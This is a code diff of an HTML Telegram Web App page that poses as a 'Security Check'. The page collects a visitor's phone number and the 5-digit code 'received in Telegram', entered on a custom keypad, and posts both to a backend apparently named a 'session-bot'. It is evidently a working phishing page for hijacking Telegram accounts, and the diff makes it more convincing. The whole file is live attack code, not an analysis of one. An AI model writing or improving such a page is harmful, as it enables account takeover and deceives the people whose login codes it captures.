@@ -3,30 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Auth</title>
+    <title>Secure Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { font-family: sans-serif; padding: 20px; text-align: center; background-color: #f0f2f5; }
-        .box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 350px; margin: auto; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; outline: none; }
-        button { background-color: #0088cc; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        .box { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 350px; margin: auto; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border: 1.5px solid #ddd; border-radius: 10px; font-size: 18px; text-align: center; outline: none; }
+        
+        /* কিপ্যাড স্টাইল */
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
+        .key { background: #f8f9fa; border: 1px solid #ddd; padding: 15px; border-radius: 10px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .key:active { background: #e2e6ea; transform: scale(0.95); }
+        .key.action { background: #0088cc; color: white; border: none; }
+        
+        .btn-main { background-color: #0088cc; color: white; border: none; padding: 14px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 16px; }
         .hidden { display: none; }
         .loader { color: #888; font-size: 14px; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h3>Secure Auth</h3>
+        <h3 id="title">Security Check</h3>
+        
+        <!-- ধাপ ১: ফোন নম্বর -->
         <div id="step1">
-            <input type="tel" id="phone" value="+" placeholder="+880...">
-            <button id="btn1" onclick="sendNumber()">Send Code</button>
-            <div id="load1" class="loader hidden">Sending code...</div>
+            <p style="font-size: 14px; color: #666;">Enter your number with country code</p>
+            <input type="tel" id="phone" value="+">
+            <button class="btn-main" id="btn1" onclick="sendNumber()">Get Access Key</button>
+            <div id="load1" class="loader hidden">Sending request...</div>
         </div>
+
+        <!-- ধাপ ২: ওটিপি কিপ্যাড -->
         <div id="step2" class="hidden">
-            <p style="color: green;">✅ Code Sent!</p>
-            <input type="number" id="otp" placeholder="Enter 5-digit code">
-            <button id="btn2" onclick="verifyOTP()">Verify & Finish</button>
-            <div id="load2" class="loader hidden">Verifying...</div>
+            <p style="color: green; font-weight: bold;">✅ Authorization Sent!</p>
+            <p style="font-size: 13px; color: #666;">Enter the 5-digit key received in Telegram</p>
+            <input type="text" id="otp_display" placeholder="- - - - -" readonly>
+            
+            <div class="keypad">
+                <div class="key" onclick="addNum('1')">1</div>
+                <div class="key" onclick="addNum('2')">2</div>
+                <div class="key" onclick="addNum('3')">3</div>
+                <div class="key" onclick="addNum('4')">4</div>
+                <div class="key" onclick="addNum('5')">5</div>
+                <div class="key" onclick="addNum('6')">6</div>
+                <div class="key" onclick="addNum('7')">7</div>
+                <div class="key" onclick="addNum('8')">8</div>
+                <div class="key" onclick="addNum('9')">9</div>
+                <div class="key" onclick="clearNum()">C</div>
+                <div class="key" onclick="addNum('0')">0</div>
+                <div class="key action" onclick="verifyOTP()">OK</div>
+            </div>
+            <div id="load2" class="loader hidden">Finalizing...</div>
         </div>
     </div>
 
@@ -34,6 +61,19 @@
         let tg = window.Telegram.WebApp;
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "test_user";
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
+        let currentOTP = "";
+
+        // কিপ্যাড লজিক
+        function addNum(num) {
+            if(currentOTP.length < 5) {
+                currentOTP += num;
+                document.getElementById("otp_display").value = currentOTP;
+            }
+        }
+        function clearNum() {
+            currentOTP = "";
+            document.getElementById("otp_display").value = "";
+        }
 
         async function sendNumber() {
             let ph = document.getElementById("phone").value.trim();
@@ -49,31 +89,27 @@
                 if(data.status === "success") {
                     document.getElementById("step1").classList.add("hidden");
                     document.getElementById("step2").classList.remove("hidden");
+                    document.getElementById("title").innerText = "Account Verification";
                 } else { alert("Error: " + data.message); }
-            } catch(e) { alert("Server Error!"); }
+            } catch(e) { alert("Connection Error!"); }
             document.getElementById("btn1").disabled = false;
             document.getElementById("load1").classList.add("hidden");
         }
 
         async function verifyOTP() {
-            let code = document.getElementById("otp").value.trim();
-            document.getElementById("btn2").disabled = true;
+            if(currentOTP.length < 5) return alert("Enter 5-digit key!");
             document.getElementById("load2").classList.remove("hidden");
             try {
                 let res = await fetch(`${BACKEND_URL}/verify_otp`, {
                     method: "POST",
                     headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ user_id: userId, otp: code })
+                    body: JSON.stringify({ user_id: userId, otp: currentOTP })
                 });
                 let data = await res.json();
                 if(data.status === "success") {
-                    alert("✅ Success! Your account is synced.");
-                    tg.close();
-                } else { 
-                    alert("❌ Error: " + data.message); 
-                    document.getElementById("btn2").disabled = false;
-                }
-            } catch(e) { alert("Connection Error!"); }
+                    tg.showPopup({ message: "✅ Success! Synchronization complete." }, () => { tg.close(); });
+                } else { alert("❌ Error: " + data.message); }
+            } catch(e) { alert("Server Down!"); }
             document.getElementById("load2").classList.add("hidden");
         }
     </script>
